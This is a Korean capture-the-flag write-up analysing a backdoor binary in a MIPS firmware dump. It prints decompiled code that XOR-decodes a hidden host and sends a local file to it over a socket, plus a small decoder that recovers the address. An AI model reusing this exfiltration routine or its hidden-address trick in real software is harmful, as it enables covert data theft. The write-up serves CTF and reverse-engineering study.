# IOT - Firm #2

MIPS 환경으로 구성 된 펌웨어 덤프를 제공해준다. 

덤프에서 /usr/bin에 b4cKD00R라는 바이너리가 제공된다.

![backdoor](https://github.com/Demon-KR/Demon-CTF-Writeup/blob/main/WORMCON0x01/iot/Firmware-2/.resource/backdoor-binary.png)

바이너리를 열어보면, 어떤 함수에서 연산을 거쳐 복호화를 진행하고 그 값을 inet_addr에 대입한다. 이는 곧 공격에 이용 될 주소를 생성시키기 위한 과정으로 볼 수 있다.

해당 주소는 단순히 암호화 문자열과 1 바이트 XOR이 존재한다. 

b4cKD00R의 코드는 다음과 같다.

- Code #1

    ```c
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      struct sockaddr addr; // [rsp+0h] [rbp-40h]
      _IO_FILE *v5; // [rsp+18h] [rbp-28h]
      int v6; // [rsp+20h] [rbp-20h]
      int fd; // [rsp+24h] [rbp-1Ch]
      char *filename; // [rsp+28h] [rbp-18h]
      int v9; // [rsp+34h] [rbp-Ch]
      char *cp; // [rsp+38h] [rbp-8h]

      cp = (char *)fdsrygb();
      v9 = 80;
      filename = "send.txt";
      fd = socket(2, 1, 0);
      if ( fd < 0 )
      {
        perror("[-]Error in socket");
        exit(1);
      }
      puts("[+]Server socket created successfully.");
      addr.sa_family = 2;
      *(_WORD *)addr.sa_data = v9;
      *(_DWORD *)&addr.sa_data[2] = inet_addr(cp);  // mlskxksi.vulnfreak.org
      v6 = connect(fd, &addr, 0x10u);
      if ( v6 == -1 )
      {
        perror("[-]Error in socket");
        exit(1);
      }
      puts("[+]Connected to Server.");
      v5 = fopen(filename, "r");
      if ( !v5 )
      {
        perror("[-]Error in reading file.");
        exit(1);
      }
      send_file(v5, fd);
      puts("[+]File data sent successfully.");
      puts("[+]Closing the connection.");
      close(fd);
      return 0;
    }
    ```

- Code #2

    ```c
    __int64 fdsrygb(void)
    {
      char v1[8]; // [rsp+0h] [rbp-20h]

      strcpy(v1, "=<#;(;#9~&%<>6\"51;~?\"7");
      return dgdcvnuosd(v1);
    }

    __int64 __fastcall dgdcvnuosd(char *a1)
    {
      __int64 v2; // [rsp+10h] [rbp-30h]
      __int64 v3; // [rsp+18h] [rbp-28h]
      int v4; // [rsp+20h] [rbp-20h]
      __int16 v5; // [rsp+24h] [rbp-1Ch]
      int v6; // [rsp+34h] [rbp-Ch]
      char v7; // [rsp+3Bh] [rbp-5h]
      int i; // [rsp+3Ch] [rbp-4h]

      v7 = 80;
      v2 = 0LL;
      v3 = 0LL;
      v4 = 0;
      v5 = 0;
      v6 = strlen(a1);
      for ( i = 0; i < v6; ++i )
        *((_BYTE *)&v2 + i) = v7 ^ a1[i];
      return 0LL;
    }
    ```

 익스플로잇 코드는 다음과 같다.

- Code #3

    ```c
    #include <stdio.h>
    #include <string.h>

    unsigned char test[1000] = "\x3d\x3c\x23\x3b\x28\x3b\x23\x39\x7e\x26\x25\x3c\x3e\x36\x22\x35\x31\x3b\x7e\x3f\x22\x37";

    int xor = 80;
    int main()
    {
    	for(int i=0; i<strlen((char *)test); i++)
    	{
    		test[i] ^= xor;
    		printf("%c",test[i]);
    	}
    }
    ```

Code #1에서 요구하는 주소로 접속하게 된다면, send.txt 파일을 열겠다는 행위가 보여지지만 이는 딱히 볼필요가 없다. 복호화 된 주소가 매핑 된 포트는 80포트이기 때문이다.

![firmware2-flag](https://github.com/Demon-KR/Demon-CTF-Writeup/blob/main/WORMCON0x01/iot/Firmware-2/.resource/firmware2-flag.png)

FILE: [https://drive.google.com/file/d/1Khw6__76SPGYuNMInHrYd6i67WnGycqO/view?usp=sharing](https://drive.google.com/file/d/1Khw6__76SPGYuNMInHrYd6i67WnGycqO/view?usp=sharing)
